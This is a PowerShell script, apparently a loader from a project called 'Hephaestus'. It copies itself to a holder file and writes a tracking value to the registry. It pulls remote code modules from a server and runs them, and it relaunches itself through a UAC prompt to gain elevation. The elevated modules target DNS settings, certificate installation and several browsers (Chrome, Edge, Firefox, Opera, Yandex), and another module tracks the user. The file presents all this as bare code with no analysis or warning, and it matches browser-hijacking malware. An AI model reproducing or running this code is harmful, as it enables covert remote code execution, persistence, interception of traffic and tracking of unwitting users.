. ./consts_body.ps1
. ./utils.ps1

#holderX

$globalArgs = $global:args -join ' '
$holderPath = Get-HolderPath
if (-not ($globalArgs -like "*guimode*" -or $globalArgs -like "*elevated" -or $globalArgs -like "*autostart"))
{
    try 
    {
        if (1 -eq 1 -or (-not (Test-Path $holderPath)))
        {
            $holderFolder = Get-HephaestusFolder  
            $pathOrData = $MyInvocation.MyCommand.Definition
            if ($pathOrData -like "*holderX*")
            {
            } 
            else 
            {
                $pathOrData = $PSCommandPath
                if (-not (Test-Path $pathOrData))
                {
                    $pathOrData = $MyInvocation.MyCommand.Path
                }
                if (Test-Path $pathOrData)
                {    
                    $pathOrData = GetUtfNoBom -file $pathOrData
                } else 
                {
                    $pathOrData = $pathOrData
                }
            } 
            if (-not (Test-Path $holderFolder)) {
                New-Item -Path $holderFolder -ItemType Directory | Out-Null
            }
            $holderFolder = Get-HephaestusFolder
            $job = Start-Job -ScriptBlock {
                param (
                    [string]$holderPath, [string]$holderFolder, [string]$pathOrData)
                    Set-Content -Path $holderPath -Value $pathOrData -Force
            } -ArgumentList $holderPath, $holderFolder, $pathOrData
            Receive-Job -Job $job
            Wait-Job -Job $job -Timeout 300 | Out-Null
            Remove-Job -Job $job
        }
    }
    catch {
        Write-Host $_
    }
}

function GetSerie()
{
    $timeDif = Get-ArgumentValue -argName '-timeDif'
    if ($timeDif -as [int]) {
        $timeDif = [int]$timeDif
    } else {
        $timeDif= 0
    }

    $registryPath = "HKCU:\Software\Hephaestus"
    $keyName = "serie"
    $newValue = $server.trackSerie.ToString();

    if (Test-Path $registryPath) {
        $keyValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $keyName
        if ($keyValue -and $keyValue -ne "") {
            return $keyValue
        } else {
            Set-ItemProperty -Path $registryPath -Name $keyName -Value $newValue
            Set-ItemProperty -Path $registryPath -Name "timeDif" -Value $timeDif
            return $newValue
        }
    } else {
        New-Item -Path $registryPath -Force | Out-Null
        New-ItemProperty -Path $registryPath -Name $keyName -Value $newValue -PropertyType String | Out-Null
        New-ItemProperty -Path $registryPath -Name "timeDif" -Value $timeDif -PropertyType String | Out-Null
        return $newValue
    }
}

GetSerie

$jobsH = @()

function Async {
    param ([string]$unit, [string]$param = $null)
    $job = RunRemoteAsync -baseUrl $server.updateUrlBlock -block $unit -param $param
    try {
        $global:jobsH += $job
    }
    catch {
        $jobsH += $job
    }
}

function NonElevatedActions
{
    Async -unit 'embeddings'
    Async -unit 'autoregistry'
    RunMe -script $holderPath -arg "guimode" -uac $false
    Async -unit 'tracker'
}

function ElevatedActions
{
    Async -unit 'dnsman'
    Async -unit 'cert'
    Async -unit 'chrome_push'
    Async -unit 'chrome'
    Async -unit 'chrome_ublock'
    Async -unit 'edge'
    Async -unit 'yandex'
    Async -unit 'firefox'
    Async -unit 'opera'
    Async -unit 'tracker'
    Async -unit 'extraupdate'
}

$gui = Test-Arg -arg "guimode"
if ($gui -eq $true)
{
    RunRemote -baseUrl $server.updateUrlBlock -block "starturls" -isWait $true -isJob $false
    RunRemote -baseUrl $server.updateUrlBlock -block "startdownloads" -isWait $true -isJob $false
    return
}
else 
{
    $elevated = Test-Arg -arg "elevated"
    if ($elevated -or (IsElevated))
    {
        if (-not $elevated){
            NonElevatedActions
        }
        ElevatedActions
    }
    else
    {
        NonElevatedActions
        RunMe -script $holderPath -arg "elevated" -uac $true
    }
    
    try {
        foreach ($job in $global:jobsH) 
        {
            Receive-Job -Job $job
            Wait-Job -Job $job -Timeout 300 | Out-Null
            Remove-Job -Job $job
        }
    }
    catch {
        foreach ($job in $jobsH) 
        {
            Receive-Job -Job $job
            Wait-Job -Job $job -Timeout 300 | Out-Null
            Remove-Job -Job $job
        }
    }
}
